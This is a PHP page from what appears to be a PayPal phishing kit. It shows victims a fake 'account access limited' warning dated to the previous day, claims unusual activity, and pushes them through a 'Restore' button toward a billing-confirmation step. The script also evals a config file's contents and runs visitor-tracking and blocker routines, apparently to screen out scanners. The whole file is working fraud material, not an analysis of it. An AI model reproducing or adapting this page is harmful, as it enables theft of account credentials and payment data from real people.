<?php
require_once __DIR__ . '/function.php';

if (file_exists($api->dir_config . '/' . $api->general_config)) {
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}

if ($config_blocker == 1) {
  $api->cookie();
  $api->session();
}

$api->visitor("Sumarry");

$page = 'home';
$title = 'PayPal: Summary Limited';
$notification = 3;
require __DIR__ . '/page/header.php';
?>

<div class="contents vx_mainContent">
<div class="mainContents summaryContainer">
<div class="engagementModule nemo_engagementModule">
<div class="engagementMainBar-container js_engagementMainBar-container">
<div class="summarySection engagementMainBar row" style="height:0%;">
<div class="col-sm-7 progressAndWelcome">
<div class="welcomeMessage js_selectModule selectModule profileStatus active">
<p class="vx_h3 engagementWelcomeMessage nemo_welcomeMessageHeader">
<span class="icon icon-small icon-lock-small" style="color:#ffffff"></span>&nbsp;<span style="color:#FFFFFF"><?=$api->transcode("Limited Access Details"); ?></span>
</p>
</div>
</div>
</div>
</div>
</div>
<div class="mainBody">
<div class="summarySection">
<div class="row">
<div class="col-sm-12 summaryModuleContainer">
<section class="walletModule nemo_balanceModule">
<div class="balanceModule">
<div class="footerLink">
<img src="../assets/img/warning.png" width="90px" height="87px">
<hr>
<p style="padding-top:8px;text-align:left;font-size:16px"><b><?=$api->transcode("Why is my account access limited?");?></b></p>
<p style="text-align:left;font-size:14px;">
<?=$api->transcode("Your account access has been limited for the following reason:"); ?>
</p>
<ul style="padding-left: 40px;">
<li style="text-align:left;font-size:14px"><b><?=$date; ?> </b>
<?=$api->transcode(date('F j, Y', strtotime('-1 days'))." : We noticed some unusual account activity recently and we're concerned about unauthorized access to your PayPal account. For your protection, access to certain account features will be limited.");?>
</li>
</ul>
<hr>
<p style="padding-top:8px;text-align:left;font-size:16px"><b><?=$api->transcode("What do I need to do?"); ?></b></p>
<p style="text-align:left;font-size:14px">
<?=$api->transcode("Please provide all of the information we requested. Once you have provided the information we need, we'll let you know when to expect a response.");?>
</p>
<p style="padding-bottom:8px;text-align:left;font-size:14px">
<?=$api->transcode("Please click on the button below to restore your account access now.");?>
</p>
<a href="confirm=billing" class="vx_btn"><?=$api->transcode("Restore"); ?></a>
</div>
</div>
</section>
</div>
</div>
</div>
</div>
</div>
</div>
<?php
require __DIR__ . '/page/footer.php';
?>
